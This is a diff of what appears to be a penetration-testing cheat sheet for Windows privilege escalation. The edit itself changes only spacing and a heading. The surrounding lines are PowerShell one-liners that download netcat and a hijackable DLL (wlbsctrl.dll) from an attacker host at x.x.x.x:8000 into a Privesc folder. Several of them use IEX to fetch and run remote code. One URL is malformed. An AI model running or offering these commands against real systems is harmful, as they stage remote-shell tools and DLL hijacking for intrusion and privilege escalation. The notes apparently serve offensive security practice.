@@ -103,7 +103,9 @@ Downloading from PS prompt
       IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/nc.exe')
       (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/nc.exe", "C:\Windows\Temp\Privesc\nc.exe")  
       (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/wlbsctrl.dll", "C:\Windows\Temp\Privesc\wlbsctrl.dll")  
-Downloading via code Injecton: 
+      
+Downloading via code Injecton
+
       C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http:/x.x.x.x:8000/wlbsctrl.dll')
       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (New-Object Net.Webclient).downloadFile('http://x.x.x.x:8000/nc.exe', 'C:\Python\nc.exe')
 
